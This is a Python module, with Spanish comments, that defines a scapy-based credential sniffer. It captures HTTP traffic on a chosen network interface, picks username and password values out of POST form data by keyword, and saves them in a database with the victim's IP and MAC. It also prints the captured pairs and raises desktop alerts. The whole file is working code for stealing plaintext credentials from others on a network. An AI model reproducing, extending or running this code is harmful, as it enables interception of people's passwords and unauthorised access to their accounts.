import scapy.all as scapy
from scapy.layers.http import HTTPRequest
import threading
import re
from backend.database import engine
from backend.models import Credential, Device
from sqlmodel import Session, select
from datetime import datetime
from backend.logger import log_event
from backend.notifier import send_notification, send_desktop_notification

class CredentialSniffer:
    """
    Sniffer profesional para capturar credenciales en texto plano (HTTP, FTP, etc).
    """
    def __init__(self):
        self.running = False
        self.interface = None
        self.thread = None
        # Lista de keywords comunes en formularios de login
        self.user_fields = ['user', 'username', 'email', 'login', 'id', 'account']
        self.pass_fields = ['pass', 'password', 'pwd', 'key', 'secret', 'contraseña']

    def start(self, interface):
        if self.running: return
        self.interface = interface
        self.running = True
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()
        print(f"🔑 Sniffer de Credenciales activo en {interface}")

    def stop(self):
        self.running = False
        self.interface = None

    def _run(self):
        try:
            scapy.sniff(
                iface=self.interface, 
                prn=self._process_packet, 
                store=0, 
                stop_filter=lambda x: not self.running
            )
        except Exception as e:
            print(f"Error en Credential Sniffer: {e}")

    def _process_packet(self, pkt):
        if not pkt.haslayer(HTTPRequest):
            return

        # Solo nos interesa el tráfico con carga útil (Raw) que suele ser POST
        if pkt.haslayer(scapy.Raw):
            load = pkt[scapy.Raw].load.decode(errors='ignore')
            
            # Buscamos patrones de usuario y contraseña
            user = None
            pwd = None
            
            # Split por '&' que es el divisor estándar de formularios POST
            pairs = load.split('&')
            for pair in pairs:
                if '=' in pair:
                    key, val = pair.split('=', 1)
                    key = key.lower()
                    
                    if any(uf in key for uf in self.user_fields):
                        user = val
                    if any(pf in key for pf in self.pass_fields):
                        pwd = val

            if user and pwd:
                ip_src = pkt[scapy.IP].src
                hostname = pkt[HTTPRequest].Host.decode() if pkt[HTTPRequest].Host else "Desconocido"
                path = pkt[HTTPRequest].Path.decode() if pkt[HTTPRequest].Path else ""
                
                self._save_credential(ip_src, hostname, user, pwd, f"URL: {hostname}{path}")

    def _save_credential(self, ip, hostname, user, pwd, context):
        with Session(engine) as session:
            # Buscar MAC por IP
            device = session.exec(select(Device).where(Device.ip == ip)).first()
            mac = device.mac if device else "UNKNOWN"
            
            cred = Credential(
                timestamp=datetime.utcnow(),
                device_mac=mac,
                ip=ip,
                protocol="HTTP",
                hostname=hostname,
                username=user,
                password=pwd,
                context=context
            )
            session.add(cred)
            session.commit()
            
            message = f"🔑 CREDENCIAL CAPTURADA: {user}:{pwd} en {hostname} (IP: {ip})"
            print(message)
            log_event("WARNING", message)
            
            # Notificación proactiva
            send_notification(message, level="WARNING")
            send_desktop_notification("🔑 CREDENTIAL SNIFFED", message, urgency="critical", icon="dialog-password")

# Instancia global
credential_sniffer = CredentialSniffer()
